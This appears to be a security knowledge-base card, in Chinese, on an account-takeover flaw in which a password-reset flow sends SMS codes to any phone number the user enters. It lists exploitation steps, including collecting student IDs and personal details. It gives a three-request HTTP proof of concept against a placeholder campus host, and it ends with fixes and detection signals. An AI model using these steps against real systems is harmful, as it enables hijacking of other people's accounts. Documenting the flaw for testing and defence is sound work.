---
id: web-generic-auth-password-reset-unbound-phone-any-phone
title: 忘记密码手机号未绑定校验缺失：用攻击者手机号接收验证码重置任意账号
type: scenario
domain: web
path: web/generic/auth
technique: password-reset-unbound-phone-takeover
tags:
- web
- auth
- password-reset
- sms
- account-takeover
- logic-flaw
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V72
  verified_at: '2026-11-05T16:53:33+08:00'
  notes: 已对照正文 0x7 节核对：忘记密码姓名+学号后进入手机号验证，原文输入攻击者自己的手机号即收到验证码并成功重置；该段配图为 xzfile 外链不在本地，仅有文字证据，卡内 confidence medium 合理。未本地复现
url: /docs/web/generic/auth/web-generic-auth-password-reset-unbound-phone-any-phone/
draft: false
kb_aliases:
- 未绑定手机号重置
- 任意手机号重置密码
- 忘记密码手机号校验缺失
- 手机号未绑定账号接管
---

## 一句话结论

找回密码流程在账号未绑定手机号时，如果允许用户自行输入任意手机号并直接向该号码发送验证码，而不校验号码与账号的绑定关系，攻击者输入自己的手机号即可收到验证码、完成验证并重置受害账号密码。

## 原理

- 短信验证码作为身份凭证的前提是：验证码发送到“账号预先绑定的手机号”，即号码与账号存在服务端可信映射。若流程允许用户提交任意手机号，且未检查该号码是否等于账号绑定号码，短信就只是“证明攻击者能收到自己手机上的短信”，而不是“证明攻击者拥有该账号”。
- 案例中忘记密码先输入姓名与学号完成基础信息验证，然后进入手机号验证页面；页面显示一个掩码手机号，但系统没有强制使用该号码，也没有阻止用户输入其他号码。攻击者输入自己的手机号，系统向该号码发送验证码，验证通过后直接进入重置密码页面。
- 根因是“把手机号当作可任意填写的传输通道，而不是账号的绑定因子”；常见于账号体系不完善、允许手机号登录但历史账号未绑定手机号的系统。
- 该缺陷与短信验证码爆破/回显不同：攻击者不需要猜验证码，只需要一个能收短信的手机号；危害取决于目标账号是否未绑定手机号。

## 触发条件

- 找回密码流程需要输入账号标识（学号/工号/用户名）与基础身份信息；
- 系统允许用户自行输入手机号，且未校验该号码与账号的绑定关系；
- 目标账号未绑定手机号，或系统对未绑定账号采用“任意号码验证”的兜底逻辑；
- 验证码发送与校验没有额外的账号归属校验（如身份证后六位、旧密码、人工审核）。

## 利用步骤

1. 收集目标账号标识与基础身份信息（学号/工号、姓名、身份证号等，来自公开名单或手册）。
2. 进入“忘记密码”，输入账号与基础信息，进入手机号验证页面。
3. 在手机号输入框填入攻击者自己的手机号；若页面有掩码号码，尝试直接修改请求中的 phone 参数。
4. 获取并输入验证码；系统若未校验绑定关系，会返回验证成功并进入重置密码页面。
5. 设置新密码并登录目标账号；确认可访问的数据与权限。

## PoC

```http
POST /uaa/sendSmsCode HTTP/1.1
Host: target.edu.cn
Content-Type: application/x-www-form-urlencoded

account=<学号/工号>&phone=<攻击者手机号>
```

```http
POST /uaa/verifySmsCode HTTP/1.1
Host: target.edu.cn
Content-Type: application/x-www-form-urlencoded

account=<学号/工号>&phone=<攻击者手机号>&smsCode=<攻击者收到的验证码>
```

```http
POST /uaa/resetPassword HTTP/1.1
Host: target.edu.cn
Content-Type: application/x-www-form-urlencoded

account=<学号/工号>&newPassword=<新密码>
```

## 变体与关联

- 变体：邮箱找回同理——允许填写任意邮箱并接收重置链接，或邮箱未绑定；手机号/邮箱参数可篡改但服务端不校验归属。
- 变体：页面显示掩码手机号，但请求参数可改成任意号码；或验证码校验只校验 code 不校验 phone。
- 关联：[[web-generic-auth-freshman-reset-id-last6-public-pii]]（弱身份要素重置）、[[web-generic-auth-email-change-no-verification-password-reset-takeover]]（改绑邮箱重置）、[[web-generic-auth-password-reset-response-tampering-sms-bypass]]（前端响应篡改）。
- 边界：账号已绑定手机号且服务端强制使用绑定号码、未绑定账号要求人工审核/证件核验时，本路径不成立。

## 检测与防御

- 修复：短信只发送到账号绑定的手机号；未绑定账号不允许自助重置，改为人工审核/证件核验/旧密码验证。
- 加固：服务端校验手机号与账号的映射，忽略客户端传入的任意号码；重置成功后通知账号属主并强制下线。
- 检测：重置请求中的 phone 与账号绑定 phone 不一致；同一手机号对多个账号发起重置；未绑定账号的异常重置频率。
